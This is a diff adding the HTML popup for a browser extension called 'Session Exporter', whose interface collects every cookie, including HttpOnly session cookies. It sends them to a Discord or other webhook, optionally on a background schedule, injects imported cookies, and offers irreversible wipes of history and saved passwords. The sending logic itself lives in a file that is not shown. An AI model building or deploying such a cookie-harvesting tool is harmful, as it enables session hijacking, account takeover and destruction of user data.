@@ -1,0 +1,546 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>L K Z</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles/redcore.css">
+</head>
+<body>
+
+
+    <div class="bg-aurora"></div>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="bg-grid"></div>
+    <canvas id="neonParticles"></canvas>
+    <div class="bg-vignette"></div>
+    <div class="bg-scanlines"></div>
+
+
+    <div class="app-wrapper">
+
+     
+        <div id="toast" class="toast"></div>
+
+        
+        <header class="header">
+            <div class="header-brand">
+                <div class="brand-badge">
+                    <img src="extraido/images/FoiceComuna.png" alt="Logo">
+                </div>
+                <h1>SESSION EXPORTER<span class="tag-version">DUDUz</span></h1>
+            </div>
+            <div class="header-controls">
+                <span class="status-pill" id="statusBadge">Online</span>
+                <button class="btn-settings" id="btnOpenSettings" title="Configurações e Webhook">⚙</button>
+
+               
+                <button class="profile-avatar-btn" id="profileAvatarBtn" title="Perfil">
+                    <span class="profile-avatar-ring"></span>
+                    <img class="profile-avatar-img"
+                         src="extraido/images/avatar.jpg"
+                         alt="Perfil"
+                         onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23100000%22/><circle cx=%2220%22 cy=%2215%22 r=%226%22 fill=%22%23FF0033%22/><path d=%22M6 36 Q20 20 34 36 Z%22 fill=%22%23FF0033%22/></svg>';">
+                </button>
+            </div>
+        </header>
+
+
+        <div class="tab-banner" id="activeTabBanner" style="display: none;">
+            <div class="tab-banner-info">
+                <span>Aba atual:</span>
+                <span class="tab-banner-domain" id="activeTabDomain">carregando...</span>
+            </div>
+            <button class="btn-filter-tab" id="btnFilterActiveTab">Filtrar este site</button>
+        </div>
+
+       
+        <section class="stats-grid">
+            <div class="stat-card c-cyan">
+                <div class="num" id="totalCookies">0</div>
+                <div class="lbl">Cookies</div>
+            </div>
+            <div class="stat-card c-emerald">
+                <div class="num" id="totalDominios">0</div>
+                <div class="lbl">Domínios</div>
+            </div>
+            <div class="stat-card c-amber">
+                <div class="num" id="totalSessao">0</div>
+                <div class="lbl">Sessão</div>
+            </div>
+            <div class="stat-card c-purple">
+                <div class="num" id="totalSeguros">0</div>
+                <div class="lbl">Seguros</div>
+            </div>
+        </section>
+
+
+        <section class="actions-toolbar">
+            <button id="btnAtualizar" class="btn-neon btn-neon-primary" title="Escanear e atualizar lista de cookies">
+                Atualizar
+            </button>
+            <button id="btnExportarTodos" class="btn-neon btn-neon-warning" title="Baixar todos os cookies em JSON oficial">
+                Exportar JSON
+            </button>
+            <button id="btnWebhookTodos" class="btn-neon btn-neon-purple" title="Enviar todos os cookies via Webhook">
+                Webhook
+            </button>
+            <button id="btnLimparTodos" class="btn-neon btn-neon-danger" title="Excluir DEFINITIVAMENTE todos os cookies do navegador">
+                Limpar Todos
+            </button>
+        </section>
+
+
+        <section class="sub-actions">
+            <button id="btnImportarJSON" class="btn-sub" title="Importar arquivo JSON de cookies">
+                Importar JSON
+            </button>
+            <button id="btnCopiarJSON" class="btn-sub" title="Copiar todos os cookies em formato JSON para a área de transferência">
+                Copiar JSON
+            </button>
+            <button id="btnExpandirTodos" class="btn-sub" title="Expandir ou recolher todos os domínios">
+                Expandir/Recolher
+            </button>
+        </section>
+
+
+        <div class="search-box">
+            <input type="text" id="filtroTexto" class="search-input" placeholder="Buscar por domínio, nome ou valor do cookie...">
+            <button id="btnClearSearch" class="search-clear-btn" title="Limpar busca">✕</button>
+        </div>
+
+
+        <div class="filter-chips">
+            <button class="chip active" data-filter="all">Todos (<span id="countAll">0</span>)</button>
+            <button class="chip" data-filter="activeTab" id="chipActiveTab" style="display: none;">Aba Atual (<span id="countActiveTab">0</span>)</button>
+            <button class="chip" data-filter="session">Sessão (<span id="countSession">0</span>)</button>
+            <button class="chip" data-filter="secure">Seguro / SSL (<span id="countSecure">0</span>)</button>
+            <button class="chip" data-filter="httpOnly">HttpOnly (<span id="countHttpOnly">0</span>)</button>
+        </div>
+
+    
+        <main id="dominiosContainer" class="list-container">
+            <div class="empty-state">
+                Carregando cookies do navegador...
+            </div>
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div>DUDUz • 171z</div>
+            <div id="timestamp">Atualizado: --</div>
+        </footer>
+
+    </div>
+
+   
+    <div id="modalCookieDetails" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Detalhes do Cookie</h3>
+                <button class="modal-close-btn" data-close="modalCookieDetails">✕</button>
+            </div>
+            <div class="modal-body">
+                <table class="details-table" id="cookieDetailsTable"></table>
+
+                <div class="form-group">
+                    <label class="form-label">Valor Completo:</label>
+                    <div class="code-block" id="cookieDetailValue"></div>
+                </div>
+
+                <div class="form-group" style="margin-top: 10px;">
+                    <label class="form-label">JSON do Cookie (Formato Oficial):</label>
+                    <div class="code-block" id="cookieDetailJSON"></div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-sub" id="btnCopyCookieValue">Copiar Valor</button>
+                <button class="btn-sub" id="btnCopyCookieJSON">Copiar JSON</button>
+                <button class="btn-neon btn-neon-warning" id="btnExportSingleCookie">Exportar JSON</button>
+                <button class="btn-neon btn-neon-danger" id="btnDeleteSingleCookieFromModal">Excluir Cookie</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. MODAL DE CONFIGURAÇÕES E WEBHOOK -->
+    <div id="modalSettings" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Configurações & Webhook</h3>
+                <button class="modal-close-btn" data-close="modalSettings">✕</button>
+            </div>
+            <div class="modal-body">
+
+                <!-- PERFIL DENTRO DAS CONFIGURAÇÕES -->
+                <div class="profile-section">
+                    <div class="profile-section-avatar-wrap">
+                        <span class="profile-section-ring"></span>
+                        <img class="profile-section-avatar"
+                             src="extraido/images/avatar.jpg"
+                             alt="Perfil"
+                             onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23100000%22/><circle cx=%2220%22 cy=%2215%22 r=%226%22 fill=%22%23FF0033%22/><path d=%22M6 36 Q20 20 34 36 Z%22 fill=%22%23FF0033%22/></svg>';">
+                    </div>
+                    <div class="profile-section-info">
+                        <span class="profile-section-name">DUDUz</span>
+                        <span class="profile-section-tag">@171z • Owner</span>
+                        <span class="profile-section-status">Online</span>
+                    </div>
+                    <div class="profile-section-actions">
+                        <button class="profile-action-btn" id="btnChangeAvatar">Trocar</button>
+                        <button class="profile-action-btn danger" id="btnRemoveAvatar">Remover</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">URL do Webhook:</label>
+                    <input type="url" id="inputWebhookUrl" class="form-input" placeholder="https://discord.com/api/webhooks/... ou endpoint HTTP">
+                    <div class="form-help">Link de Webhook do Discord, n8n, Make, Zapier ou API REST.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Formato de Envio:</label>
+                    <select id="selectWebhookMode" class="form-select">
+                        <option value="auto">Detecção Automática (Discord / API)</option>
+                        <option value="json">JSON Puro</option>
+                        <option value="json_raw">Array JSON Direto [ { ... } ]</option>
+                        <option value="discord">Discord Payload Formatado</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Cabeçalho de Autorização Opcional:</label>
+                    <input type="text" id="inputWebhookAuth" class="form-input" placeholder="Bearer seu_token (opcional)">
+                </div>
+
+                <div style="display: flex; gap: 8px; margin-top: 8px;">
+                    <button class="btn-sub" id="btnTestWebhook" style="flex: 1;">Testar Conexão Webhook</button>
+                    <span id="webhookTestResult" style="font-size: 10px; align-self: center; font-weight: 700;"></span>
+                </div>
+
+                <hr style="border: 0; border-top: 1px solid var(--border-glass); margin: 12px 0;">
+
+                <div class="form-group">
+                    <label class="form-label">Sincronização em Segundo Plano:</label>
+                    <div style="display: flex; align-items: center; gap: 8px; margin-top: 4px;">
+                        <input type="checkbox" id="chkAutoSync" style="cursor: pointer;">
+                        <label for="chkAutoSync" style="font-size: 11px; cursor: pointer;">Ativar captura automática periódica</label>
+                    </div>
+                </div>
+
+                <div class="form-group" id="groupAutoSyncInterval" style="display: none;">
+                    <label class="form-label">Intervalo (minutos):</label>
+                    <input type="number" id="inputAutoSyncInterval" class="form-input" min="5" max="1440" value="30">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-sub" id="btnDeathWipe" style="color:#FF1744; border-color:rgba(255,23,68,.6); font-weight:800; background:rgba(255,23,68,.15); margin-right:auto;">☠ BOTÃO DA MORTE</button>
+                <button class="btn-sub" data-close="modalSettings">Cancelar</button>
+                <button class="btn-neon btn-neon-primary" id="btnSaveSettings">Salvar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. MODAL DE CONFIRMAÇÃO DE EXCLUSÃO -->
+    <div id="modalConfirmDelete" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3 style="color: var(--neon-red);">Confirmar Exclusão</h3>
+                <button class="modal-close-btn" data-close="modalConfirmDelete">✕</button>
+            </div>
+            <div class="modal-body">
+                <p id="confirmDeleteMessage" style="line-height: 1.5; color: var(--text-primary); margin-bottom: 10px;">
+                    Tem certeza de que deseja excluir permanentemente estes cookies do navegador?
+                </p>
+                <div style="background: rgba(255, 94, 122, 0.12); border: 1px solid rgba(255, 94, 122, 0.3); border-radius: 6px; padding: 8px; color: #ffb3c0; font-size: 10px;">
+                    Atenção: Esta ação remove as sessões do navegador de forma definitiva.
+                </div>
+                <div id="fullWipeSection" style="display:none; margin-top:10px; padding-top:10px; border-top:1px dashed rgba(255,23,68,.35);">
+                    <button class="btn-neon btn-neon-danger" id="btnConfirmFullWipe" style="width:100%; background:#FF1744; color:#fff; font-weight:700;">☠ WIPE TOTAL do Domínio</button>
+                    <div class="form-help" style="color:#FFA0B0; margin-top:4px; text-align:center;">Apaga cookies + cache + storage + histórico + IndexedDB + service workers DESTE domínio.</div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-sub" data-close="modalConfirmDelete">Cancelar</button>
+                <button class="btn-neon btn-neon-danger" id="btnConfirmDeleteExec">Excluir Definitivamente</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. MODAL DE IMPORTAÇÃO DE JSON -->
+    <div id="modalImport" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Importar Cookies JSON</h3>
+                <button class="modal-close-btn" data-close="modalImport">✕</button>
+            </div>
+            <div class="modal-body">
+                <div style="background: rgba(4, 14, 8, 0.7); border: 1px solid var(--border-glass); border-radius: 6px; padding: 10px; margin-bottom: 12px;">
+                    <div style="font-size: 11px; font-weight: 700; color: var(--neon-cyan);" id="importStatsPreview">Carregando dados...</div>
+                </div>
+                <div class="form-group">
+                    <label style="display: flex; align-items: flex-start; gap: 8px; cursor: pointer; margin-bottom: 8px;">
+                        <input type="radio" name="importMode" value="view" checked style="margin-top: 2px;">
+                        <div>
+                            <strong style="color: #fff;">Apenas Visualizar na Lista</strong>
+                            <div class="form-help">Carrega na interface para inspeção ou cópia, sem alterar o navegador.</div>
+                        </div>
+                    </label>
+                    <label style="display: flex; align-items: flex-start; gap: 8px; cursor: pointer;">
+                        <input type="radio" name="importMode" value="inject" style="margin-top: 2px;">
+                        <div>
+                            <strong style="color: var(--neon-amber);">Gravar no Navegador (chrome.cookies.set)</strong>
+                            <div class="form-help">Restaura os cookies nas sessões do seu navegador.</div>
+                        </div>
+                    </label>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-sub" data-close="modalImport">Cancelar</button>
+                <button class="btn-neon btn-neon-primary" id="btnApplyImport">Concluir</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5. MODAL DE WIPE TOTAL (LIMPEZA MASSIVA) -->
+    <div id="modalWipeTotal" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3 style="color:#FF1744; text-shadow:0 0 12px rgba(255,23,68,.8);">☠ LIMPEZA MASSIVA TOTAL</h3>
+                <button class="modal-close-btn" data-close="modalWipeTotal">✕</button>
+            </div>
+            <div class="modal-body">
+                <div style="background:rgba(255,23,68,.15); border:2px solid #FF1744; border-radius:6px; padding:12px; margin-bottom:12px;">
+                    <strong style="color:#FF8A9A; font-size:12px; display:block; margin-bottom:6px; letter-spacing:.5px;">⚠ ATENÇÃO MÁXIMA ⚠</strong>
+                    <span style="color:#FFD0D6; font-size:11px; line-height:1.6; display:block;">
+                        Esta operação irá apagar <strong style="color:#FF1744;">TUDO ABSOLUTAMENTE</strong>:<br>
+                         -  Todos os cookies (todos os domínios)<br>
+                         -  Todo o histórico de navegação<br>
+                         -  Cache e armazenamento local de todos os sites<br>
+                         -  Histórico de downloads<br>
+                         -  IndexedDB, localStorage, sessionStorage, WebSQL<br>
+                         -  Service workers, file systems e sessões<br>
+                         -  <strong>SENHAS SALVAS</strong><br><br>
+                        <strong style="color:#FF1744;">É IRREVERSÍVEL. Não há como recuperar.</strong>
+                    </span>
+                </div>
+                <div style="background:rgba(10,0,0,.7); border:1px solid rgba(255,0,51,.3); border-radius:6px; padding:10px; font-family:var(--font-mono); font-size:10px; color:#FFA0B0; line-height:1.7;">
+                    <div>Escopo: <strong style="color:#FF1744;">NAVEGADOR INTEIRO</strong></div>
+                    <div>Recuperável: <strong style="color:#FF1744;">NÃO</strong></div>
+                    <div>Config da extensão: <strong style="color:#FFAA33;">PRESERVADA</strong></div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-sub" data-close="modalWipeTotal">Cancelar</button>
+                <button class="btn-neon btn-neon-danger" id="btnExecWipeTotal" style="background:#FF1744; color:#fff; font-weight:800; letter-spacing:.5px;">☠ APAGAR TUDO AGORA</button>
+            </div>
+        </div>
+    </div>
+    <!-- 6. MODAL DO BOTÃO DA MORTE -->
+    <div id="modalDeathConfirm" class="modal-overlay">
+        <div class="modal-card" style="border-color: #FF1744; box-shadow: 0 0 40px rgba(255,23,68,.6);">
+            <div class="modal-header" style="background: rgba(255,23,68,.2);">
+                <h3 style="color:#FF1744; text-shadow:0 0 12px rgba(255,23,68,.8);">⚠ PROTOCOLO DE EXTERMÍNIO ⚠</h3>
+                <button class="modal-close-btn" data-close="modalDeathConfirm">✕</button>
+            </div>
+            <div class="modal-body">
+                <div style="text-align: center; margin-bottom: 15px;">
+                    <span style="font-size: 40px;">☠</span>
+                </div>
+                <p style="color:#FF8A9A; font-weight: 700; font-size: 13px; text-align: center; margin-bottom: 12px; line-height: 1.5;">
+                    VOCÊ ESTÁ PRESTES A DEIXAR O NAVEGADOR TOTALMENTE VIRGEM.
+                </p>
+                <div style="background:rgba(0,0,0,.6); border:1px solid #FF1744; border-radius:6px; padding:12px; font-family:var(--font-mono); font-size:10px; color:#FFD0D6; line-height:1.8;">
+                    <div> - <strong>TODOS</strong> os cookies e sessões ativas</div>
+                    <div> -  <strong>LOGOUT FORÇADO</strong> da conta do Google (Gmail, YouTube, etc)</div>
+                    <div> -  Histórico de navegação, downloads e formulários</div>
+                    <div> -  Cache, localStorage, IndexedDB, Service Workers</div>
+                    <div> -  Senhas salvas no navegador</div>
+                    <div style="margin-top: 8px; color: #FF1744; font-weight: 800; text-align: center;">NÃO HÁ VOLTA. A LIMPEZA É IRREVERSÍVEL.</div>
+                </div>
+            </div>
+            <div class="modal-footer" style="background: rgba(255,23,68,.1);">
+                <button class="btn-sub" data-close="modalDeathConfirm">Recuar</button>
+                <button class="btn-neon btn-neon-danger" id="btnExecDeathWipe" style="background:#FF1744; color:#fff; font-weight:800; letter-spacing:1px;">☠ EXECUTAR LIMPEZA VIOLENTA</button>
+            </div>
+        </div>
+    </div>
+
+    <input type="file" id="fileInput" accept=".json">
+
+
+    <script>
+    (function() {
+        'use strict';
+
+        /* ============================================================
+           BACKGROUND 1- MATRIX
+           ============================================================ */
+        const matrixCanvas = document.getElementById('matrixCanvas');
+        const mCtx = matrixCanvas.getContext('2d');
+        let mW, mH, mCols, mDrops;
+        const M_FONT = 14;
+        const M_CHARS = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF$ｱｲｳｴｵ<>[]{}/*-+=$#@%&';
+
+        function matrixResize() {
+            mW = matrixCanvas.width = window.innerWidth;
+            mH = matrixCanvas.height = window.innerHeight;
+            mCols = Math.floor(mW / M_FONT);
+            mDrops = new Array(mCols).fill(0).map(() => Math.random() * -mH / M_FONT);
+        }
+        matrixResize();
+        window.addEventListener('resize', matrixResize);
+
+        let matrixLast = 0;
+        function matrixLoop(now) {
+            if (now - matrixLast > 55) {
+                matrixLast = now;
+                mCtx.fillStyle = 'rgba(10, 0, 0, 0.10)';
+                mCtx.fillRect(0, 0, mW, mH);
+                mCtx.font = M_FONT + 'px monospace';
+                for (let i = 0; i < mDrops.length; i++) {
+                    const ch = M_CHARS.charAt(Math.floor(Math.random() * M_CHARS.length));
+                    const x = i * M_FONT;
+                    const y = mDrops[i] * M_FONT;
+                    const bright = Math.random();
+                    if (bright > 0.95) {
+                        mCtx.fillStyle = '#FFE6EA';
+                        mCtx.shadowColor = '#FF0033';
+                        mCtx.shadowBlur = 12;
+                    } else if (bright > 0.7) {
+                        mCtx.fillStyle = '#FF0033';
+                        mCtx.shadowColor = '#FF0033';
+                        mCtx.shadowBlur = 8;
+                    } else {
+                        mCtx.fillStyle = 'rgba(255, 0, 51, 0.7)';
+                        mCtx.shadowColor = 'transparent';
+                        mCtx.shadowBlur = 0;
+                    }
+                    mCtx.fillText(ch, x, y);
+                    if (y > mH && Math.random() > 0.975) mDrops[i] = 0;
+                    else mDrops[i] += 0.6 + Math.random() * 0.4;
+                }
+            }
+            requestAnimationFrame(matrixLoop);
+        }
+        requestAnimationFrame(matrixLoop);
+
+        /* ============================================================
+           BACKGROUND 2 ´reticle
+           ============================================================ */
+        const bgCanvas = document.getElementById('neonParticles');
+        const bgCtx = bgCanvas.getContext('2d');
+        let bgW, bgH, bgParticles = [];
+        const BG_COUNT = 60;
+
+        function bgResize() {
+            bgW = bgCanvas.width = window.innerWidth;
+            bgH = bgCanvas.height = window.innerHeight;
+        }
+        bgResize();
+        window.addEventListener('resize', bgResize);
+
+        function makeBgParticle() {
+            return {
+                x: Math.random() * bgW,
+                y: Math.random() * bgH,
+                r: Math.random() * 1.8 + 0.4,
+                vx: (Math.random() - 0.5) * 0.45,
+                vy: (Math.random() - 0.5) * 0.45,
+                a: Math.random() * 0.6 + 0.3,
+                pulse: Math.random() * Math.PI * 2
+            };
+        }
+        for (let i = 0; i < BG_COUNT; i++) bgParticles.push(makeBgParticle());
+
+        function bgLoop() {
+            bgCtx.clearRect(0, 0, bgW, bgH);
+            for (const p of bgParticles) {
+                p.x += p.vx;
+                p.y += p.vy;
+                p.pulse += 0.025;
+                if (p.x < -10) p.x = bgW + 10;
+                if (p.x > bgW + 10) p.x = -10;
+                if (p.y < -10) p.y = bgH + 10;
+                if (p.y > bgH + 10) p.y = -10;
+                const alpha = p.a * (0.6 + 0.4 * Math.sin(p.pulse));
+                const grd = bgCtx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r * 6);
+                grd.addColorStop(0, 'rgba(255, 0, 51, ' + alpha + ')');
+                grd.addColorStop(0.5, 'rgba(255, 0, 51, ' + (alpha * 0.35) + ')');
+                grd.addColorStop(1, 'rgba(255, 0, 51, 0)');
+                bgCtx.fillStyle = grd;
+                bgCtx.beginPath();
+                bgCtx.arc(p.x, p.y, p.r * 6, 0, Math.PI * 2);
+                bgCtx.fill();
+            }
+            bgCtx.lineWidth = 0.5;
+            for (let i = 0; i < bgParticles.length; i++) {
+                for (let j = i + 1; j < bgParticles.length; j++) {
+                    const a = bgParticles[i], b = bgParticles[j];
+                    const dx = a.x - b.x, dy = a.y - b.y;
+                    const d2 = dx * dx + dy * dy;
+                    if (d2 < 120 * 120) {
+                        const alpha = (1 - Math.sqrt(d2) / 120) * 0.22;
+                        bgCtx.strokeStyle = 'rgba(255, 0, 51, ' + alpha + ')';
+                        bgCtx.beginPath();
+                        bgCtx.moveTo(a.x, a.y);
+                        bgCtx.lineTo(b.x, b.y);
+                        bgCtx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(bgLoop);
+        }
+        bgLoop();
+
+        /* ============================================================
+          profile
+           ============================================================ */
+        const profileBtn = document.getElementById('profileAvatarBtn');
+        if (profileBtn) {
+            profileBtn.addEventListener('click', function() {
+                const btnSettings = document.getElementById('btnOpenSettings');
+                if (btnSettings) btnSettings.click();
+            });
+        }
+
+        /* Botões dentro do modal de Configurações */
+        const btnChangeAvatar = document.getElementById('btnChangeAvatar');
+        if (btnChangeAvatar) {
+            btnChangeAvatar.addEventListener('click', function() {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.onchange = function(e) {
+                    const file = e.target.files && e.target.files[0];
+                    if (!file) return;
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        const url = ev.target.result;
+                        document.querySelectorAll('.profile-avatar-img, .profile-section-avatar, .profile-popover-avatar').forEach(function(img) {
+                            img.src = url;
+                        });
+                    };
+                    reader.readAsDataURL(file);
+                };
+                input.click();
+            });
+        }
+        const btnRemoveAvatar = document.getElementById('btnRemoveAvatar');
+        if (btnRemoveAvatar) {
+            btnRemoveAvatar.addEventListener('click', function() {
+                const placeholder = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><rect width="40" height="40" fill="%23100000"/><circle cx="20" cy="15" r="6" fill="%23FF0033"/><path d="M6 36 Q20 20 34 36 Z" fill="%23FF0033"/></svg>';
+                document.querySelectorAll('.profile-avatar-img, .profile-section-avatar').forEach(function(img) {
+                    img.src = placeholder;
+                });
+            });
+        }
+
+    })();
+    </script>
+
+    <script src="popup.js"></script>
+</body>
+</html>
